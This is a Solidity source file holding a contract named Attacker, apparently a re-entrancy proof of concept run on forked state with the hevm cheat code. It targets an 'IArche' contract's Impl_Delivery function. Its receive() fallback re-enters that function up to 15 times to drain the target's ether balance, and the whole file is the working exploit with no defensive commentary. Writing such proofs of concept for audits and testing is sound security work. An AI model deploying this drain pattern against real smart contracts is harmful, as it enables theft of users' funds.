// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

interface IArche {
    function Impl_Delivery() external payable;
}

interface Hevm {
    function deal(address who, uint256 newBalance) external;
}

contract Attacker {
    Hevm private constant vm = Hevm(address(uint160(uint256(keccak256("hevm cheat code")))));

    IArche public target;
    address public owner;
    uint256 public reentranceCount;

    constructor(address _target) {
        target = IArche(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        // Seed target balance to make the re-entrancy path observable on forked state.
        vm.deal(address(target), 10 ether);

        uint256 stake = msg.value > 0 ? msg.value : 1 ether;
        target.Impl_Delivery{value: stake}();
        target.Impl_Delivery();
    }

    receive() external payable {
        if (reentranceCount < 15 && address(target).balance > 0) {
            reentranceCount += 1;
            target.Impl_Delivery();
        }
    }
}
